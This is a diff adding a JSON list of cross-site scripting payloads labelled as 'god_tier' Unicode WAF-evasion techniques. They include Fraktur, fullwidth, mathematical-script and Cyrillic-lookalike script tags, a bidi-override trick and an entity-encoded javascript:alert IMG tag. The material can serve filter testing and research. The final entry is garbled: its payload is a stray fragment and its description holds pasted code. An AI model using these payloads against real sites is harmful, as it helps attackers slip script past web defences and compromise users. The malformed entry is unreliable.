@@ -1,0 +1,97 @@
+[
+  {
+    "Payload": "<𝕤𝕔𝕣𝕚𝕡𝕥>𝒶𝓁ℯ𝓇𝓉(1)</𝕤𝕔𝕣𝕚𝕡𝕥>",
+    "Attribute": [
+      ">",
+      "(",
+      "/",
+      "<",
+      ")"
+    ],
+    "waf": "unicode_evasion",
+    "count": 0,
+    "description": "Cuneiform / Exotic Identifiers: Fraktur + cursive characters in <script>",
+    "level": "god_tier",
+    "category": "exotic_unicode",
+    "technique": "cuneiform___exotic_identifiers"
+  },
+  {
+    "Payload": "<sᴄʀɪᴘᴛ>ａｌｅｒｔ(1)</sᴄʀɪᴘᴛ>",
+    "Attribute": [
+      ">",
+      "(",
+      "/",
+      "<",
+      ")"
+    ],
+    "waf": "unicode_evasion",
+    "count": 0,
+    "description": "Cuneiform / Exotic Identifiers: Fullwidth mixed with IPA letters",
+    "level": "god_tier",
+    "category": "exotic_unicode",
+    "technique": "cuneiform___exotic_identifiers"
+  },
+  {
+    "Payload": "<𝓈𝒸𝓇𝒾𝓅𝓉>document.𝓌𝓇𝒾𝓉𝑒(\"XSS\")</𝓈𝒸𝓇𝒾𝓅𝓉>",
+    "Attribute": [
+      ">",
+      "(",
+      "\"",
+      "<",
+      ")",
+      "/"
+    ],
+    "waf": "unicode_evasion",
+    "count": 0,
+    "description": "Unicode Obfuscation: Mathematical script letters",
+    "level": "god_tier",
+    "category": "exotic_unicode",
+    "technique": "unicode_obfuscation"
+  },
+  {
+    "Payload": "<sсrіpt>alert(\"😼\")</sсrіpt>",
+    "Attribute": [
+      ">",
+      "(",
+      "\"",
+      "<",
+      ")",
+      "/"
+    ],
+    "waf": "unicode_evasion",
+    "count": 0,
+    "description": "Visual Spoofing: Cyrillic lookalikes: с (U+0441), і (U+0456)",
+    "level": "god_tier",
+    "category": "exotic_unicode",
+    "technique": "visual_spoofing"
+  },
+  {
+    "Payload": "<span style=\"unicode-bidi:bidi-override;direction:rtl;\">\"}1(trela</span><script>",
+    "Attribute": [
+      ">",
+      "(",
+      "\"",
+      "<",
+      "/",
+      "="
+    ],
+    "waf": "unicode_evasion",
+    "count": 0,
+    "description": "Unicode Bidi Spoofing: Right-to-left override trick",
+    "level": "god_tier",
+    "category": "exotic_unicode",
+    "technique": "unicode_bidi_spoofing"
+  },
+  {
+    "Payload": " 540);",
+    "Attribute": [
+      ")"
+    ],
+    "waf": "unicode_evasion",
+    "count": 0,
+    "description": " list.Add(\"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\": None",
+    "level": "god_tier",
+    "category": "exotic_unicode",
+    "technique": "_list.add(\"<img_src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\""
+  }
+]
